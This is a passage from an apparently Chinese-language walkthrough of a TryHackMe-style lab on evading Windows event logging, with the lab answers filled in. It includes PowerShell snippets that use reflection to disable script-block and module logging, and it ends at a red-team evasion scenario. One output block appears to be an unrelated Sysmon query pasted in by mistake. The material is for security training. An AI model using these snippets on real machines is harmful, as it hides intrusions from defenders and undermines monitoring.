class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>用于修补 ETW 的非分隔操作码（opcode）是什么？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">c21400</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="providers-via-policy---通过策略的提供者">Providers via Policy - 通过策略的提供者<a href="#providers-via-policy---通过策略的提供者" class="hash-link" aria-label="Direct link to Providers via Policy - 通过策略的提供者" title="Direct link to Providers via Policy - 通过策略的提供者">​</a></h2>
<p>ETW 默认提供了广泛的覆盖，但由于生成的日志量，某些功能会被禁用，除非特别指定。这些功能可以通过修改其父策略的 <strong>GPO</strong>（<strong>G</strong>roup <strong>P</strong>olicy <strong>O</strong>bject）设置来启用。两个最流行的 GPO 提供者覆盖了 PowerShell，包括 <strong>脚本块日志记录</strong> 和 <strong>模块日志记录</strong>。</p>
<p>脚本块日志记录会记录 PowerShell 会话中执行的任何脚本块。此功能在 PowerShell v4 中引入，并在 PowerShell v5 中得到改进，ETW 提供者会报告两个事件 ID。</p>
<table><thead><tr><th><strong>事件 ID</strong></th><th><strong>目的</strong></th></tr></thead><tbody><tr><td>4103</td><td>记录命令调用</td></tr><tr><td>4104</td><td>记录脚本块执行</td></tr></tbody></table>
<p>事件 ID 4104 对攻击者最为重要，如果脚本未正确混淆或隐藏，可能会暴露其脚本。以下是 4104 日志的简短示例。</p>
<div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Event ID:4104</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Source:Microsoft-Windows-PowerShell</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Category:Execute a Remote Command</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Log:Microsoft-Windows-PowerShell/Operational</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Message:Creating Scriptblock text (1 of 1):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Write-Host PowerShellV5ScriptBlockLogging</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ScriptBlock ID: 6d90e0bb-e381-4834-8fe2-5e076ad267b3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Path:</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>模块日志记录是一个非常详细的提供者，它会记录任何模块及其发送的数据。该功能在 PowerShell v3 中引入，每个 PowerShell 会话中的模块充当提供者并记录其自己的模块。与之前的提供者类似，这些模块会将事件写入事件 ID 4103。以下是 4103 日志的示例。</p>
<div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Event ID:4103</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Source:Microsoft-Windows-PowerShell</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Category:Executing Pipeline</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Log:Microsoft-Windows-PowerShell/Operational</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Message:CommandInvocation(Write-Host): &quot;Write-Host&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ParameterBinding(Write-Host): name=&quot;Object&quot;; </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">value=&quot;TestPowerShellV5&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Context:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Severity = Informational</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Host Name = ConsoleHost</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[snip]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User = DOMAIN\\username</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Connected User =</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Shell ID = Microsoft.PowerShell</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>事件 ID 4103 对攻击者来说不那么常见，因为生成的日志量较大。这通常会导致它被视为不那么严重，甚至被完全禁用。</p>
<p>尽管攻击者可以使用 ETW 补丁，但这些补丁并不总是实际可行的，或者不是规避日志记录的最佳方法。作为替代，攻击者可以针对这些提供者进行攻击，逐步限制可见性，同时不像其他技术那样显眼或嘈杂。</p>
<p>禁用这些提供者的一般目标是限制所需组件的可见性，同时仍然让环境看起来没有被篡改。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>通过脚本块和模块提供者启用的总事件数是多少？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>哪个事件 ID 会记录脚本块执行？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">4104</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="group-policy-takeover---组策略接管">Group Policy Takeover - 组策略接管<a href="#group-policy-takeover---组策略接管" class="hash-link" aria-label="Direct link to Group Policy Takeover - 组策略接管" title="Direct link to Group Policy Takeover - 组策略接管">​</a></h2>
<p>模块日志记录和脚本块日志记录提供者都是通过组策略启用的，具体路径为 <code>管理模板 -&gt; Windows 组件 -&gt; Windows PowerShell</code>。如任务 4 中所述，在 PowerShell 会话中，系统程序集与用户处于相同的安全上下文中。这意味着攻击者拥有与缓存 GPO 设置的程序集相同的权限级别。通过反射，攻击者可以获取实用程序字典并修改 PowerShell 提供者的组策略。</p>
<p>从高层次来看，组策略接管可以分为三个步骤：</p>
<ol>
<li>从实用程序缓存中获取组策略设置。</li>
<li>将通用提供者修改为 <code>0</code>。</li>
<li>修改调用或模块定义。</li>
</ol>
<p>我们将通过一个 PowerShell 脚本示例来分解每个步骤，并详细解释每个步骤。</p>
<p>在第一步中，我们必须使用反射来获取 <code>System.Management.Automation.Utils</code> 的类型，并识别 GPO 缓存字段：<code>cachedGroupPolicySettings</code>。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$GroupPolicySettingsField = [ref].Assembly.GetType(&#x27;System.Management.Automation.Utils&#x27;).GetField(&#x27;cachedGroupPolicySettings&#x27;, &#x27;NonPublic,Static&#x27;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在第二步，我们可以利用 GPO 变量将任一事件提供者的设置修改为 <code>0</code>。<code>EnableScriptBlockLogging</code> 将控制 <strong>4104</strong> 事件，限制脚本执行的可见性。修改可以通过直接写入对象或注册表来完成。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$GroupPolicySettings[&#x27;ScriptBlockLogging&#x27;][&#x27;EnableScriptBlockLogging&#x27;] = 0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在第三步，我们可以对任何其他提供者设置重复前一步骤，<code>EnableScriptBlockInvocationLogging</code> 将控制 <strong>4103</strong> 事件，限制 cmdlet 和管道执行的可见性。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$GroupPolicySettings[&#x27;ScriptBlockLogging&#x27;][&#x27;EnableScriptBlockInvocationLogging&#x27;] = 0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>我们可以将这些步骤编译在一起，并将它们附加到恶意 PowerShell 脚本中。使用提供的 PowerShell 脚本并尝试这种技术。</p>
<p>注意：脚本的核心功能与上述代码相同，但稍作修改以符合 PowerShell v.5.1 的更新。</p>
<p>为了证明脚本的有效性，我们可以执行它并测量给定命令返回的事件数量。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\Users\Administrator\Desktop&gt; Get-WinEvent -FilterHashtable @{ProviderName=&quot;Microsoft-Windows-PowerShell&quot;; Id=4104} | Measure | % Count</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\Users\Administrator\Desktop&gt; whoami</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Tryhackme\administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\Users\Administrator\Desktop&gt; Get-WinEvent -FilterHashtable @{ProviderName=&quot;Microsoft-Windows-PowerShell&quot;; Id=4104} | Measure | % Count</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>👇</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\Users\THM-Analyst&gt; Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Hunting_Metasploit.evtx -FilterXPath &#x27;*/System/EventID=3 and */EventData/Data[@Name=&quot;DestinationPort&quot;] and */EventData/Data=4444&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   ProviderName: Microsoft-Windows-Sysmon</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">TimeCreated                     Id LevelDisplayName Message</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-----------                     -- ---------------- -------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1/5/2021 2:21:32 AM              3 Information      Network connection detected:...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在第一个终端中，我们看到在运行 PowerShell 脚本时生成了三个事件。在第二个终端中，在执行脚本后，我们看到运行命令时没有生成任何事件。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>使用这种技术可以禁用哪些事件 ID？（从低到高，用逗号分隔）</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">4103, 4104</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>哪个提供者设置控制 4104 事件？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">EnableScriptBlockLogging</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="abusing-log-pipeline---滥用日志管道">Abusing Log Pipeline - 滥用日志管道<a href="#abusing-log-pipeline---滥用日志管道" class="hash-link" aria-label="Direct link to Abusing Log Pipeline - 滥用日志管道" title="Direct link to Abusing Log Pipeline - 滥用日志管道">​</a></h2>
<p>在 PowerShell 中，每个模块或 snap-in 都有一个设置，任何人都可以使用该设置来修改其日志记录功能。根据<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_eventlogs?view=powershell-5.1#logging-module-events" target="_blank" rel="noopener noreferrer">微软文档</a>， “当 <em>LogPipelineExecutionDetails</em> 属性值为 TRUE（<code>$true</code>）时，Windows PowerShell 会将 cmdlet 和函数执行事件记录到事件查看器中的 Windows PowerShell 日志。” 攻击者可以在任何 PowerShell 会话中将该值更改为 <code>$false</code>，以禁用特定会话的模块日志记录。微软文档中甚至提到可以禁用用户会话的日志记录，“要禁用日志记录，请使用相同的命令序列将属性值设置为 FALSE（<code>$false</code>）。”</p>
<p>从高层次来看，日志管道技术可以分为四个步骤：</p>
<ol>
<li>获取目标模块。</li>
<li>将模块执行详细信息设置为 <code>$false</code>。</li>
<li>获取模块 snap-in。</li>
<li>将 snap-in 执行详细信息设置为 <code>$false</code>。</li>
</ol>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$module = Get-Module Microsoft.PowerShell.Utility # Get target module</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$module.LogPipelineExecutionDetails = $false # Set module execution details to false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$snap = Get-PSSnapin Microsoft.PowerShell.Core # Get target ps-snapin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$snap.LogPipelineExecutionDetails = $false # Set ps-snapin execution details to false</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>上面的脚本块可以附加到任何 PowerShell 脚本中，或者在会话中运行，以禁用当前导入模块的模块日志记录。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>这种方法将阻止哪种类型的日志记录？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Module logging</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>哪个目标模块将禁用所有 Microsoft 实用程序模块的日志记录？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Microsoft.PowerShell.Utility</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="real-world-scenario---实际场景">Real World Scenario - 实际场景<a href="#real-world-scenario---实际场景" class="hash-link" aria-label="Direct link to Real World Scenario - 实际场景" title="Direct link to Real World Scenario - 实际场景">​</a></h2>
<p>在这个场景中，你是被指派构建一个规避脚本的红队操作员，任务是禁用 ETW 并执行一个编译好的二进制文件。在这个场景中，环境完整性至关重要，蓝队正在积极监控环境。你的团队已经告知你，他们主要关注监控 web 流量；如果流量被停止，他们可能会警觉到你的连接。假设蓝队也在寻找可疑日志，但并未转发日志。利用在本课程中获得的知识，创建一个脚本，在不被干扰的情况下执行二进制文件或命令。</p>
<details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p></p><summary>具体操作步骤</summary>
